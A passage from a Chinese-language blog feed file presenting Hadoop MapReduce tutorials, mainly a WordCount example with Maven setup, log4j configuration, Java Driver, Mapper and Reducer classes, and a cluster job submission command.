class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 22:14 2022/12/17</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlowDriver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.获取job对象</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Job</span> <span class="variable">job</span> <span class="operator">=</span> Job.getInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.关联 driver mapper reducer</span></span><br><span class="line">        job.setJarByClass(FlowDriver.class);</span><br><span class="line">        job.setMapperClass(FlowMapper.class);</span><br><span class="line">        job.setReducerClass(FlowReducer.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.设置 map 端输出 KV 类型</span></span><br><span class="line">        job.setMapOutputKeyClass(Text.class);</span><br><span class="line">        job.setMapOutputValueClass(FlowBean.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.设置程序最终输出 KV 类型</span></span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(FlowBean.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.设置程序输入输出路径</span></span><br><span class="line">        FileInputFormat.setInputPaths(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\phone_data.txt&quot;</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\output2\\&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6.提交job</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> job.waitForCompletion(<span class="literal">true</span>);</span><br><span class="line">        System.exit(b ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MapReduce WordCount案例</title>
      <link href="/blog/5bb35ccf.html/"/>
      <url>/blog/5bb35ccf.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：需求"><a href="#一：需求" class="headerlink" title="一：需求"></a>一：需求</h1><p>对本地 WordCount.txt 文件进行词频统计，其内容均按 “,”分割，将统计结果输出到 outputDir 目录下；</p><h1 id="二：代码实现"><a href="#二：代码实现" class="headerlink" title="二：代码实现"></a>二：代码实现</h1><h2 id="2-1-环境引入"><a href="#2-1-环境引入" class="headerlink" title="2.1 环境引入"></a>2.1 环境引入</h2><h3 id="（1）Maven-依赖"><a href="#（1）Maven-依赖" class="headerlink" title="（1）Maven 依赖"></a>（1）Maven 依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="（2）配置日志"><a href="#（2）配置日志" class="headerlink" title="（2）配置日志"></a>（2）配置日志</h3><p>在项目的 src&#x2F;main&#x2F;resources 目录下，新建一个文件，命名为“log4j.properties”，在 文件中填入。</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">log4j.rootLogger</span>=<span class="string">INFO, stdout</span></span><br><span class="line"><span class="attr">log4j.appender.stdout</span>=<span class="string">org.apache.log4j.ConsoleAppender</span></span><br><span class="line"><span class="attr">log4j.appender.stdout.layout</span>=<span class="string">org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="attr">log4j.appender.stdout.layout.ConversionPattern</span>=<span class="string">%d %p [%c] - %m%n</span></span><br><span class="line"><span class="attr">log4j.appender.logfile</span>=<span class="string">org.apache.log4j.FileAppender</span></span><br><span class="line"><span class="attr">log4j.appender.logfile.File</span>=<span class="string">target/spring.log</span></span><br><span class="line"><span class="attr">log4j.appender.logfile.layout</span>=<span class="string">org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="attr">log4j.appender.logfile.layout.ConversionPattern</span>=<span class="string">%d %p [%c] - %m%n</span></span><br></pre></td></tr></table></figure><h2 id="2-2-编写代码"><a href="#2-2-编写代码" class="headerlink" title="2.2 编写代码"></a>2.2 编写代码</h2><p>创建包 cn.aiyingke.mapreduce.wordcount</p><h3 id="（1）Driver-类"><a href="#（1）Driver-类" class="headerlink" title="（1）Driver 类"></a>（1）Driver 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> driver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> mapper.WordCountMapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"><span class="keyword">import</span> reducer.WordCountReducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: Rupert Tears</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: Created in 18:17 2022/1/18</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Function</span>: 在 hdfs 中的某一目录下，有一些列文件，内容均为 “,”号分割，</span></span><br><span class="line"><span class="comment"> * 统计出按 “,”分割的各个元素出现频次，输出到指定 hdfs目录中。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 概述：词频统计工作</span></span><br><span class="line"><span class="comment"> * 驱动器类：</span></span><br><span class="line"><span class="comment"> * 1.拿到配置环境变量</span></span><br><span class="line"><span class="comment"> * 2.拿到job作业对象</span></span><br><span class="line"><span class="comment"> * 3.设置主类，（即：告知集群入口jar包在哪）</span></span><br><span class="line"><span class="comment"> * 4.设置 mapper combiner reducer</span></span><br><span class="line"><span class="comment"> * 5.设置输出 key value的类型</span></span><br><span class="line"><span class="comment"> * 6.设置输入、输出的数据路径</span></span><br><span class="line"><span class="comment"> * 7.提交执行</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountDriver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       1.拿到配置环境变量</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       2.拿到job作业对象</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Job</span> <span class="variable">job</span> <span class="operator">=</span> Job.getInstance(configuration, <span class="string">&quot;WordCount-MR&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       3.设置主类，（即：告知集群入口jar包在哪）</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        job.setJarByClass(WordCountDriver.class);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *      4.设置 mapper combiner reducer</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        job.setMapperClass(WordCountMapper.class);</span><br><span class="line">        job.setCombinerClass(WordCountReducer.class);</span><br><span class="line">        job.setReducerClass(WordCountReducer.class);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       5.设置输出 key value的类型</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(IntWritable.class);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       6.设置输入、输出的数据路径</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        FileInputFormat.addInputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;S:\\Software\\IDEA 2021.1.2\\IDEA-workspace\\Rupert-Tears\\MapReduce\\WordCount\\data\\instanceData\\WordCount.txt&quot;</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;S:\\Software\\IDEA 2021.1.2\\IDEA-workspace\\Rupert-Tears\\MapReduce\\WordCount\\data\\outputDir&quot;</span>));</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       7.提交执行</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.exit(job.waitForCompletion(<span class="literal">true</span>) ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）Mapper-类"><a href="#（2）Mapper-类" class="headerlink" title="（2）Mapper 类"></a>（2）Mapper 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.StringTokenizer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: Rupert Tears</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: Created in 18:22 2022/1/18</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountMapper</span> <span class="keyword">extends</span> <span class="title class_">Mapper</span>&lt;Object, Text, Text, IntWritable&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 暂存一个常用的IntWritable对象，对 java 整形的封装</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">IntWritable</span> <span class="variable">intWritable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 暂存一个 String 的封装类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">Text</span> <span class="variable">text</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 覆写map方法</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> InterruptedException 1.对输入的文件，以行为单位进行切分，按规则切分（空格）；</span></span><br><span class="line"><span class="comment">     *                              2.遍历切分完成后的集合或迭代器</span></span><br><span class="line"><span class="comment">     *                              3.组合&lt;key,value&gt;,通过Context进行输出</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(Object key, Text value, Mapper&lt;Object, Text, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 将传入的数据转换为字符串 指定分割符号为逗号</span></span><br><span class="line">        <span class="type">StringTokenizer</span> <span class="variable">stringTokenizer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTokenizer</span>(value.toString(), <span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="comment">// 循环获取每个逗号分割出来的元素</span></span><br><span class="line">        <span class="keyword">while</span> (stringTokenizer.hasMoreTokens()) &#123;</span><br><span class="line">            <span class="comment">// 接收获取元素</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">word</span> <span class="operator">=</span> stringTokenizer.nextToken();</span><br><span class="line">            <span class="comment">// 添加分割后的元素到封装类中</span></span><br><span class="line">            text.set(word);</span><br><span class="line">            <span class="comment">// 上下文调度</span></span><br><span class="line">            context.write(text, intWritable);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）Reducer-类"><a href="#（3）Reducer-类" class="headerlink" title="（3）Reducer 类"></a>（3）Reducer 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: Rupert Tears</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: Created in 18:23 2022/1/18</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountReducer</span> <span class="keyword">extends</span> <span class="title class_">Reducer</span>&lt;Text, IntWritable, Text, IntWritable&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义一个存储 int类型的求和结果的变量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">IntWritable</span> <span class="variable">sumIntWritable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 以key相同的组为单位处理，即 Reducer 方法调用一次，处理同 key的组数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Reducer&lt;Text, IntWritable, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 定义一个总词频变量</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 循环计数</span></span><br><span class="line">        <span class="keyword">for</span> (IntWritable val : values) &#123;</span><br><span class="line">            count += val.get();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将频数封装</span></span><br><span class="line">        sumIntWritable.set(count);</span><br><span class="line">        <span class="comment">// 上下文调度</span></span><br><span class="line">        context.write(key, sumIntWritable);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-3-本地测试"><a href="#2-3-本地测试" class="headerlink" title="2.3 本地测试"></a>2.3 本地测试</h2><p>（1）需要首先配置好 HADOOP_HOME 变量以及 Windows 运行依赖</p><p>（2）在 IDEA上运行程序即可。</p><h1 id="三：集群测试"><a href="#三：集群测试" class="headerlink" title="三：集群测试"></a>三：集群测试</h1><h2 id="3-1-打包插件"><a href="#3-1-打包插件" class="headerlink" title="3.1 打包插件"></a>3.1 打包插件</h2><p>用 maven 打 jar 包，需要添加的打包插件依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assembly<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-2-修改输入输出"><a href="#3-2-修改输入输出" class="headerlink" title="3.2 修改输入输出"></a>3.2 修改输入输出</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FileInputFormat.addInputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(args[<span class="number">0</span>]));</span><br><span class="line">FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(args[<span class="number">1</span>]));</span><br></pre></td></tr></table></figure><h2 id="3-3-上传集群并执行命令"><a href="#3-3-上传集群并执行命令" class="headerlink" title="3.3 上传集群并执行命令"></a>3.3 上传集群并执行命令</h2><p>输入输出文件应为HDFS中的文件路径；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 ~]$ hadoop jar /home/ghost/mapreduce/MapReduceDemo-1.0-SNAPSHOT.jar cn.aiyingke.mapreduce.wordcount.WordCountDriver /word.txt /output</span><br></pre></td></tr></table></figure><p>part-r-00000：其中包含 r 代表的是 reduce 的结果；</p><p><img src="/blog/5bb35ccf.html/image-20221217002553625.png"></p>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MapReduce 概述</title>
      <link href="/blog/b6d0a624.html/"/>
      <url>/blog/b6d0a624.html/</url>
      
